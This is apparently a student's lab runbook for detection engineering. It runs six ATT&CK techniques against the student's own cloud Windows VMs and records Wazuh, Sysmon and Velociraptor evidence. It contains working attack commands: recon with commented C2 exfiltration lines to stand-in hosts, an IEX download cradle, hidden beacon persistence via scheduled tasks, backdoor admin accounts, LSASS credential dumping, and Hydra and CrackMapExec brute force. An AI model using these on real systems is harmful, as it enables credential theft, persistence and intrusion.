# Days 4–5 — Attack Simulation (6 Attacks)

**Dates**: April 23–24, 2026  
**Target**: Run 6 attacks from local Kali → collect detection evidence → leave artifacts on disk for EDR extraction  
**Criteria served**: 2 (Attacks & Logs)  
**Connection**: Local Kali (attacker) → Cloud VMs (targets), RDP to Windows, Browser for dashboards  

---

## The Full Pipeline (How Days 4–10 Connect)

```
DAYS 4–5:  Run 6 attacks → leave artifacts on disk
                    │
DAY 6:     Configure EDR (Wazuh Active Response + Velociraptor hunts)
                    │  EDR IS NOW FULLY ARMED
                    │
DAY 7:     Drop malware on endpoint → EDR detects + auto-kills
           → Velociraptor EXTRACTS the binary from endpoint
                    │
DAYS 8–10: Extracted binary → Sandbox → Analysis → IOCs → YARA rules
```

> [!IMPORTANT]
> **Days 4-5 = attacks only.** The malware drop happens on **Day 7** after EDR is fully configured (Day 6), so the EDR can detect and respond to it in real time. That's the full pipeline demo.

---

## Pre-Flight (Do This First)

### 1. Create AWS Snapshots

Go to **AWS Console → EC2 → Instances**:

- DC → **Actions → Create Image** → Name: `snapshot_20260423_pre-attack_DC`
- Client → **Actions → Create Image** → Name: `snapshot_20260423_pre-attack_Client`

Wait for both AMIs to show `available` (5–10 min).

### 2. Verify All Services Running

| Machine | Service | Command |
|---|---|---|
| Ubuntu | Wazuh manager | `sudo systemctl status wazuh-manager` |
| Ubuntu | Velociraptor | `sudo systemctl status velociraptor` |
| DC | Wazuh agent | `Get-Service WazuhSvc` |
| DC | Sysmon | `Get-Service Sysmon64` |
| DC | Velociraptor | `Get-Service Velociraptor` |
| Client | Same 3 | Same commands |

### 3. Open Ports for Kali

Add to DC + Client **Security Groups**:

| Port | Protocol | Source | Purpose |
|---|---|---|---|
| 445 | TCP | Your Kali public IP | SMB |
| 5985 | TCP | Your Kali public IP | WinRM |
| 5986 | TCP | Your Kali public IP | WinRM HTTPS |

Find Kali's public IP: `curl ifconfig.me`

### 4. Open Dashboards

Keep open in browser:
- **Tab 1**: Wazuh Dashboard → Security Events
- **Tab 2**: Velociraptor GUI → Hunt Manager

### 5. Create Artifact Directories

```powershell
$base = "C:\Users\Bayram Rasulov\Desktop\CS\ITSkills\artifacts"
@(
    "20260423_powershell_exec",
    "20260423_account_creation",
    "20260423_scheduled_task",
    "20260424_credential_dump",
    "20260424_brute_force",
    "20260424_lateral_movement"
) | ForEach-Object { New-Item -Path "$base\$_" -ItemType Directory -Force }
```

### 6. Prepare Attack Staging Folder on DC

RDP into DC and create a staging folder that simulates where an attacker would drop files:

```powershell
New-Item -Path "C:\Temp" -ItemType Directory -Force
New-Item -Path "C:\Users\Public\Downloads" -ItemType Directory -Force
```

---

## Binary Tracking Table

**Fill this in as you go** — these files stay on disk. Velociraptor extracts them on Day 6:

| Attack # | Dropped File | Path on Endpoint | Hash (SHA256) | Purpose |
|---|---|---|---|---|
| 1 | `payload.ps1` | `C:\Temp\payload.ps1` | _fill later_ | Attacker recon script |
| 3 | `persistence.bat` | `C:\Temp\persistence.bat` | _fill later_ | Persistence backdoor |
| 4 | `procdump64.exe` | `C:\Temp\Procdump\procdump64.exe` | _fill later_ | Attacker tool |

> **Do NOT delete any dropped files until after Day 6** — Velociraptor needs to extract them.
> 
> The **malware sample** for sandbox analysis gets dropped on **Day 7** (after EDR is armed on Day 6).

---

# DAY 4 — Attacks 1, 2, 3

---

## Attack 1: T1059.001 — PowerShell Execution (with Dropped Script)

**MITRE ATT&CK**: Execution → Command and Scripting Interpreter: PowerShell  
**Target**: DC  
**What's different**: We leave a `.ps1` script on disk for later extraction

### Step 1: Drop a Malicious-Looking PowerShell Script

RDP into DC, open PowerShell as Admin:

```powershell
# Create a script that looks like an attacker's recon tool
# This is SAFE — it just collects system info, but it looks suspicious
$script = @'
# Reconnaissance Script - Simulated Attacker Tool
$computerInfo = Get-WmiObject Win32_OperatingSystem
$users = net user /domain
$admins = net localgroup Administrators
$processes = Get-Process | Select-Object Name, Id, Path
$networkConns = netstat -an
$shares = net share

# Exfil simulation - encode and prepare data
$data = @{
    hostname = $env:COMPUTERNAME
    domain = $env:USERDOMAIN
    users = $users
    admins = $admins
    os = $computerInfo.Caption
}
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($data | ConvertTo-Json)))

# Would send to C2 in real attack
# Invoke-WebRequest -Uri "http://evil-c2.com/exfil" -Method POST -Body $encoded
Write-Host "Recon complete. Data encoded: $($encoded.Length) bytes"
'@

# Save the script to disk (THIS IS WHAT GETS EXTRACTED LATER)
$script | Out-File -FilePath "C:\Temp\payload.ps1" -Encoding UTF8
```

### Step 2: Execute the Script (Triggers Detection)

```powershell
# Execute it — this WILL be detected by Wazuh + Sysmon
powershell -ExecutionPolicy Bypass -File "C:\Temp\payload.ps1"

# Also run encoded command (another detection hit)
$encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami; ipconfig; net user /domain"))
powershell -EncodedCommand $encodedCmd

# And a download cradle (won't connect anywhere, but looks malicious)
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/test')"
```

### Step 3: Record the File Hash

```powershell
# Get the hash of the dropped script (you'll need this for the report)
Get-FileHash "C:\Temp\payload.ps1" -Algorithm SHA256
```

📝 **Write down the hash** — add it to the Binary Tracking Table above.

### Step 4: Collect Detection Evidence

**Wazuh Dashboard:**
1. Go to DC01 → Events → filter last 15 min
2. Search: `powershell` or `EncodedCommand`
3. Look for alerts:
   - PowerShell script block logging events
   - Sysmon Event ID 1 (process creation — `powershell.exe`)
   - Sysmon Event ID 11 (file creation — `payload.ps1`)
4. 📸 Screenshot the alerts
5. Export alert as JSON → save to `artifacts/20260423_powershell_exec/`

**Velociraptor** (quick check, full hunt on Day 6):
1. Go to DC01 → Collected Artifacts → New Collection
2. Collect: `Windows.System.Pslist` — verify `powershell.exe` shows up
3. 📸 Screenshot

> [!IMPORTANT]  
> **DO NOT delete `C:\Temp\payload.ps1`** — Velociraptor extracts it on Day 6.

---

## Attack 2: T1136.001 — Create Local Account

**MITRE ATT&CK**: Persistence → Create Account: Local Account  
**Target**: DC

### Run the Attack

```powershell
# Create backdoor accounts
net user hacker Password123! /add
net localgroup Administrators hacker /add

net user svc_backup Str0ngP@ss2026! /add
net localgroup "Remote Desktop Users" svc_backup /add

# Verify
net user
```

### Expected Detections

| Source | Event |
|---|---|
| Wazuh | Event 4720 — user created |
| Wazuh | Event 4732 — user added to admin group |
| Sysmon | Event ID 1 — `net.exe` / `net1.exe` process creation |

### Collect Evidence

1. Wazuh → search `4720` and `4732` → 📸 Screenshot → Export JSON
2. Save to `artifacts/20260423_account_creation/`

> [!NOTE]
> **Don't delete the accounts yet** — we'll use them for lateral movement on Day 5. Delete after all attacks.

---

## Attack 3: T1053.005 — Scheduled Task Persistence (with Dropped Script)

**MITRE ATT&CK**: Persistence → Scheduled Task/Job: Scheduled Task  
**Target**: DC  
**What's different**: We create an actual persistence script on disk

### Step 1: Create the Persistence Payload

```powershell
# Create a batch file that looks like a persistence backdoor
$persistScript = @'
@echo off
REM Persistence backdoor - simulated
REM This would maintain attacker access in a real scenario
powershell -WindowStyle Hidden -Command "while($true){Start-Sleep 300; Invoke-WebRequest -Uri 'http://127.0.0.1:8080/beacon' -Method POST -Body (hostname) -ErrorAction SilentlyContinue}"
'@

$persistScript | Out-File -FilePath "C:\Temp\persistence.bat" -Encoding ASCII

# Also create a fake "health check" script
$healthScript = @'
# SystemHealthCheck.ps1 — disguised persistence
$beacon = @{
    id = [System.Environment]::MachineName
    time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    user = [System.Environment]::UserName
}
# C2 callback (simulated)
# Invoke-RestMethod -Uri "http://c2-server.evil/check" -Method POST -Body ($beacon | ConvertTo-Json)
'@

$healthScript | Out-File -FilePath "C:\Users\Public\health.ps1" -Encoding UTF8
```

### Step 2: Create the Scheduled Tasks

```powershell
# Scheduled task pointing to the persistence script
schtasks /create /tn "WindowsUpdate" /tr "C:\Temp\persistence.bat" /sc onlogon /ru SYSTEM /f

# Another one with a less suspicious name
schtasks /create /tn "SystemHealthCheck" /tr "powershell.exe -WindowStyle Hidden -File C:\Users\Public\health.ps1" /sc daily /st 03:00 /ru SYSTEM /f

# Verify
schtasks /query /tn "WindowsUpdate"
schtasks /query /tn "SystemHealthCheck"
```

### Step 3: Record Hashes

```powershell
Get-FileHash "C:\Temp\persistence.bat" -Algorithm SHA256
Get-FileHash "C:\Users\Public\health.ps1" -Algorithm SHA256
```

📝 Add to Binary Tracking Table.

### Step 4: Collect Evidence

**Wazuh:**
1. Search for `schtasks` or Event ID `4698`
2. 📸 Screenshot → Export JSON

**Sysmon:**
1. Event ID 1 — `schtasks.exe` with command-line showing the task details
2. Event ID 11 — file creation for `persistence.bat` and `health.ps1`
3. 📸 Screenshot

> [!IMPORTANT]  
> **DO NOT delete tasks or scripts yet** — Velociraptor extracts them on Day 6.

---

# DAY 5 — Attacks 4, 5, 6

---

## Attack 4: T1003.001 — Credential Dumping (Leaves Tool on Disk)

**MITRE ATT&CK**: Credential Access → OS Credential Dumping: LSASS Memory  
**Target**: DC  
**What's different**: `procdump64.exe` stays on disk as an "attacker tool" for extraction

### Step 1: Download and Run Procdump

RDP into DC:

```powershell
# Download procdump (this is a real Sysinternals tool — attacker TTP to use legit tools)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Path "C:\Temp\Procdump" -ItemType Directory -Force
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Procdump.zip" -OutFile "C:\Temp\Procdump\Procdump.zip"
Expand-Archive -Path "C:\Temp\Procdump\Procdump.zip" -DestinationPath "C:\Temp\Procdump" -Force

# Dump LSASS memory
C:\Temp\Procdump\procdump64.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp
```

```powershell
# Also try the LOLBAS technique (living off the land)
$lsassPid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Temp\lsass2.dmp full
```

### Step 2: Record Hashes

```powershell
Get-FileHash "C:\Temp\Procdump\procdump64.exe" -Algorithm SHA256
# The .dmp file is too large for sandbox — just hash it for IOCs
Get-FileHash "C:\Temp\lsass.dmp" -Algorithm SHA256 -ErrorAction SilentlyContinue
```

📝 Add `procdump64.exe` to Binary Tracking Table.

### Step 3: Collect Evidence

**Wazuh:**
1. Search `lsass` or Sysmon Event ID `10` (process access)
2. Look for Sysmon Event ID `11` (file creation — `.dmp` file)
3. 📸 Screenshot → Export JSON

> [!WARNING]
> **Delete the `.dmp` files** (they contain real credentials) but keep `procdump64.exe`:
> ```powershell
> Remove-Item "C:\Temp\lsass.dmp" -Force -ErrorAction SilentlyContinue
> Remove-Item "C:\Temp\lsass2.dmp" -Force -ErrorAction SilentlyContinue
> ```
> `procdump64.exe` stays — Velociraptor extracts it as "attacker tool" on Day 6.

---

## Attack 5: T1110.001 — Brute Force

**MITRE ATT&CK**: Credential Access → Brute Force: Password Guessing  
**Target**: DC  
**From**: Local Kali

### Run the Attack

```bash
# Create password list
echo -e "password123\nadmin\nwrongpass\nletmein\nPassword1\nqwerty123\ntest1234\nP@ssw0rd\nSpring2026\nWelcome1" > /tmp/passwords.txt

# Method 1: Hydra RDP brute force
hydra -l Administrator -P /tmp/passwords.txt rdp://<DC-PUBLIC-IP> -t 4 -V

# Method 2: CrackMapExec SMB brute force
echo -e "Administrator\nadmin\nnihat.kazimzada\nkanan.rasulov\nhacker" > /tmp/users.txt
crackmapexec smb <DC-PUBLIC-IP> -u /tmp/users.txt -p /tmp/passwords.txt

# Method 3: Simple loop (fallback)
for pass in password123 admin wrongpass letmein Password1 qwerty123 test1234 P@ssw0rd Spring2026 Welcome1 Fail1 Fail2; do
    echo "Trying: $pass"
    smbclient //<DC-PUBLIC-IP>/C$ -U "Administrator%$pass" -c "exit" 2>&1
    sleep 0.5
done
```

> Run at least **10+ failed attempts** to trigger brute force detection rules.

### Collect Evidence

**Wazuh:**
1. Search Event ID `4625` — flood of failed logons
2. Look for rule `5712` (brute force detected)
3. 📸 Screenshot the alert burst
4. **Note your Kali public IP** — it will appear in the alerts
5. Export JSON

Save to `artifacts/20260424_brute_force/`

---

## Attack 6: T1021.001 — Lateral Movement via RDP

**MITRE ATT&CK**: Lateral Movement → Remote Services: RDP  
**Target**: Client → DC (simulating internal lateral movement)

### Run the Attack

RDP into **Client** machine:

```powershell
# 1. Recon from Client (like an attacker who just compromised it)
whoami
hostname
ipconfig
net view /domain
net group "Domain Admins" /domain

# 2. Use the hacker account we created in Attack 2
# RDP from Client to DC using the backdoor account
cmdkey /add:<DC-PRIVATE-IP> /user:hacker /pass:Password123!
mstsc /v:<DC-PRIVATE-IP>
```

In the new RDP session on DC (logged in as `hacker`):
```powershell
# Attacker commands after lateral movement
whoami
hostname
net user /domain
dir C:\Users
type C:\Users\Administrator\Desktop\*.txt 2>$null
```

Close the RDP session, then cleanup:
```powershell
# Back on Client — remove stored creds
cmdkey /delete:<DC-PRIVATE-IP>
```

### Collect Evidence

**Wazuh (Client):**
1. Event `4648` — explicit credential logon
2. 📸 Screenshot

**Wazuh (DC):**
1. Event `4624` Type 10 — RDP logon from Client IP, user `hacker`
2. 📸 Screenshot → this is lateral movement evidence

Save to `artifacts/20260424_lateral_movement/`

---

## End of Day 5: State of Dropped Files

**DO NOT clean these up yet** — Velociraptor extracts them on Day 6:

| File | Path | Purpose |
|---|---|---|
| `payload.ps1` | `C:\Temp\payload.ps1` | Recon script (Attack 1) |
| `persistence.bat` | `C:\Temp\persistence.bat` | Persistence backdoor (Attack 3) |
| `health.ps1` | `C:\Users\Public\health.ps1` | Disguised persistence (Attack 3) |
| `procdump64.exe` | `C:\Temp\Procdump\procdump64.exe` | Attacker tool (Attack 4) |

Also still present:
- Scheduled tasks: `WindowsUpdate`, `SystemHealthCheck`
- Backdoor accounts: `hacker`, `svc_backup`

**Everything gets cleaned up AFTER Day 7.**

---

## Attack Summary — Fill In As You Go

Create `artifacts/attack_summary.md`:

```markdown
# Attack Simulation Summary

| # | Technique | ATT&CK ID | Target | Dropped File | Wazuh? | Sysmon? | Velociraptor? |
|---|---|---|---|---|---|---|---|
| 1 | PowerShell Exec | T1059.001 | DC | payload.ps1 | ✅/❌ | ✅/❌ | ✅/❌ |
| 2 | Account Creation | T1136.001 | DC | — | ✅/❌ | ✅/❌ | ✅/❌ |
| 3 | Scheduled Task | T1053.005 | DC | persistence.bat | ✅/❌ | ✅/❌ | ✅/❌ |
| 4 | Credential Dump | T1003.001 | DC | procdump64.exe | ✅/❌ | ✅/❌ | ✅/❌ |
| 5 | Brute Force | T1110.001 | DC | — | ✅/❌ | ✅/❌ | — |
| 6 | Lateral Movement | T1021.001 | Client→DC | — | ✅/❌ | ✅/❌ | ✅/❌ |

⚠️ Malware Drop (Attack 7) happens on Day 7 after EDR is armed.

Operator: _______________
Dates: April 23–24, 2026
Snapshot: snapshot_20260423_pre-attack
```

---

## ✅ Days 4–5 Completion Checklist

- [ ] AWS snapshots created
- [ ] Attack 1: PowerShell exec — run + `payload.ps1` on disk + evidence
- [ ] Attack 2: Account creation — run + accounts exist + evidence
- [ ] Attack 3: Scheduled task — run + scripts on disk + tasks exist + evidence
- [ ] Attack 4: Credential dump — run + `procdump64.exe` on disk + evidence
- [ ] Attack 5: Brute force — run from Kali + evidence
- [ ] Attack 6: Lateral movement — Client→DC + evidence
- [ ] All dropped files present (NOT deleted)
- [ ] Attack summary table started
- [ ] All artifacts in organized folders
- [ ] Screenshots taken
- [ ] Git commit pushed

---

## What’s Next: Day 6 → Day 7

**Day 6**: Configure EDR (Wazuh Active Response + Velociraptor hunts for attack artifacts from today)

**Day 7**: **Malware Drop Simulation** with EDR fully armed:
1. Drop malware on endpoint
2. EDR detects → Wazuh alerts → Active Response kills process
3. Velociraptor extracts the binary from the endpoint
4. Extracted binary goes to sandbox on Day 8

**This is the full pipeline: Attack → Detect → Respond → Extract → Analyze**
